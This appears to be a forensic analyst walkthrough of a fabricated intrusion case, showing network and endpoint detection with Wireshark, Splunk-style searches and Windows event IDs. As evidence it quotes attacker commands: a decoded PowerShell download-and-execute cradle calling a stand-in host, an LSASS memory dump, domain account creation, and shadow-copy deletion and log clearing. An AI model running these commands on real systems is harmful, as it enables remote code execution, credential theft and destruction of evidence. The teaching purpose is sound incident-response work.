# CASE-2026-011 Analyst Walkthrough

This walkthrough works the sample case **by hand**, the way you would in a SOC
or in the HTB CDSA exam environment with Splunk, Wireshark and Event Viewer.
Each step then shows the CaseKit detection that automates it. The point is
that the tool encodes an analyst's reasoning; it does not replace it.

> Synthetic case. All hosts, people, hashes and indicators are fabricated.

## 0. Preserve before you analyse

Before opening anything, hash it and record who has it:

```bash
casekit intake cases/CASE-2026-011 --examiner "Ahnaf Akif" --note "Received from client IR lead via SFTP"
```

Each custody entry stores the SHA-256 of the previous entry. If someone later
"corrects" an entry, `casekit verify` reports the exact entry where the chain
breaks. Send the head `entry_hash` to the client in the intake email, which
anchors the chain outside your own control.

## 1. Triage the network first: it is the hardest log to fake

**Question:** is anything on the network behaving like a machine rather than a person?

Wireshark: `Statistics → Conversations → IPv4`, sorted by bytes:

| A | B | Bytes A→B |
|---|---|---|
| 10.10.20.57 | 203.0.113.50 | ~1.6 MB |

A finance workstation pushing 1.6 MB to an unknown host in one session is the
first lead. Next, look at DNS:

```
dns.flags.response == 0 && !(dns.qry.name contains "microsoft") && !(dns.qry.name contains "windows")
```

`api.cdn-sync.example` repeats roughly every 60 s. Export the timestamps and
compute the gaps: mean ≈ 60 s with very low spread. A human browsing produces
bursty, irregular lookups; a constant interval means an implant is checking in.

*CaseKit:* `analytic.dns_beacon` computes the coefficient of variation of the
inter-arrival times (0.04 here, against a threshold of 0.30). `time.windows.com`
is just as periodic but is allow-listed, which shows why an allow-list matters
for this analytic.

```
dns.qry.name contains "tlmcache"
```

These queries carry 52-character base32 labels with sequence numbers
(`.000.`, `.001.` …). That is data being smuggled out inside DNS.

*CaseKit:* `analytic.dns_tunnel` flags label length ≥ 25 together with Shannon
entropy ≥ 3.5 bits/char.

```
http.request
```

`GET /assets/stage2.ps1` with User-Agent `WindowsPowerShell/5.1`: PowerShell,
not a browser, fetched a script in cleartext.

```
tls.handshake.extensions_server_name
```

SNI shows the names behind the encrypted sessions: `api.cdn-sync.example` for
C2 and `files.cdn-sync.example` for the exfiltration endpoint.

## 2. Pivot to the endpoint: who made that traffic?

Splunk-style search over the WS-FIN-07 Sysmon log:

```spl
index=sysmon host=WS-FIN-07 EventCode=3 DestinationIp IN ("203.0.113.45","203.0.113.50")
| table _time Image DestinationIp DestinationPort
```

The answer is `C:\Users\Public\Libraries\svchost.exe`. The real svchost.exe lives
only in `C:\Windows\System32`, so this one is masquerading (T1036.005).

Walk the parents (EID 1, `ParentProcessGuid`), not the PIDs, which Windows reuses:

```
OUTLOOK.EXE → WINWORD.EXE → powershell.exe -nop -w hidden -enc SQBFAFgA… → svchost.exe (Public)
```

Decode the `-enc` blob: Base64 over **UTF-16LE**, not UTF-8.

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("SQBFAFgA..."))
# IEX (New-Object Net.WebClient).DownloadString('http://update.cdn-sync.example/assets/stage2.ps1')
```

That links the HTTP request in the PCAP to the macro. *CaseKit* does the same
decoding in `enrich.py`, which is how the URL appears as an IOC even though
the command line itself contains only Base64.

Persistence check, Sysmon EID 13 on `\CurrentVersion\Run`: the value
`OneDriveSync` points at the implant. It sits next to the real `OneDrive` value
to blend in.

## 3. Credential access: the pivot point of the whole intrusion

```spl
index=sysmon host=WS-FIN-07 (EventCode=10 TargetImage="*lsass.exe") OR (EventCode=1 CommandLine="*comsvcs*")
```

- EID 1: `rundll32.exe comsvcs.dll, MiniDump 712 …\wct4E1.tmp full`. PID 712 is LSASS.
- EID 10: rundll32 opened lsass.exe with `GrantedAccess 0x1FFFFF` (full access).
- EID 11: the dump was written as a `.tmp` file to make it look harmless.

**Whose credentials were in LSASS?** Check the workstation's Security log for
logons before the dump:

```spl
index=wineventlog host=WS-FIN-07 EventCode=4624 | table _time TargetUserName LogonType IpAddress
```

At 07:52, `adm.rahman` logged on with LogonType 10 (RDP) from the helpdesk. A
domain admin's credentials were cached on a standard workstation, and that
control failure is the root cause behind everything that follows.

## 4. Lateral movement: pass-the-hash to the DC

```spl
index=wineventlog host=DC01 EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
| table _time TargetUserName IpAddress WorkstationName LogonProcessName KeyLength
```

`adm.rahman` logged on from 10.10.20.57 (WS-FIN-07) over **NTLM** with
`LogonProcessName=NtLmSsp` and `KeyLength=0`. Every other logon in this domain
uses Kerberos. One second later, System EID 7045 records `PSEXESVC` being installed.
The timing ties the two events together.

On DC01, Sysmon shows `PSEXESVC.exe → cmd.exe → net user svc_backup … /add /domain`,
followed by Security 4720 (account created) and 4728 (added to **Domain Admins**).

## 5. Collection, exfiltration and cleanup

- 09:48: `7za.exe a -p… fin_q3.7z "\\FS01\Finance\Q3-2026\*"`. A password-protected
  archive with encrypted headers (`-mhe=on`) hides even the file names from DLP.
- 09:52: the 1.6 MB flow from step 1. Its timing fits the archive being sent.
- 10:05: the DNS tunnel. At ~1.4 KB, the payload is too small to be the archive
  and fits a credential extract.
- 10:12: `vssadmin delete shadows /all /quiet` on the workstation.
- 10:14: `wevtutil cl Security` on DC01, followed by **EID 1102**.

Why do we still have DC01's events? They were collected from the **Windows
Event Forwarding** server, which had already received them before the local
clear. That is the strongest practical argument for central log collection.

## 6. Separate signal from noise

The SSH brute force against WEB01 (64 failures from 198.51.100.23) looks
alarming, but there is **no `Accepted` line from that IP** and it involves a
different host and a different time. It is reported as *medium,
opportunistic* and kept out of the main narrative. Folding it into the
intrusion would be a common analyst mistake.

*CaseKit:* brute force is only escalated to critical when a successful logon
from the same source follows within 30 minutes.

## 7. Write it so someone can act on it

A report is finished when a reader can:

1. understand the impact in the first paragraph (domain compromise, data exfiltrated),
2. block the IOCs without breaking production, which is why system-binary hashes are excluded,
3. fix the root causes (tiered admin, no local admin rights, macro blocking), not only the symptoms,
4. verify every claim against the evidence (record numbers in each finding).

See the generated report: [`sample-report/report.md`](sample-report/report.md).

## Event ID cheat sheet used in this case

| Source | EID | Meaning |
|---|---|---|
| Sysmon | 1 / 3 / 10 / 11 / 13 | Process create / network connection / process access / file create / registry value set |
| Security | 4624 / 4625 | Logon success / failure (LogonType 2 interactive, 3 network, 10 RDP) |
| Security | 4672 | Special privileges assigned to a new logon |
| Security | 4720 / 4728 / 4732 | User created / added to global group / added to local group |
| Security | 1102 | Security log cleared |
| System | 7045 | Service installed |
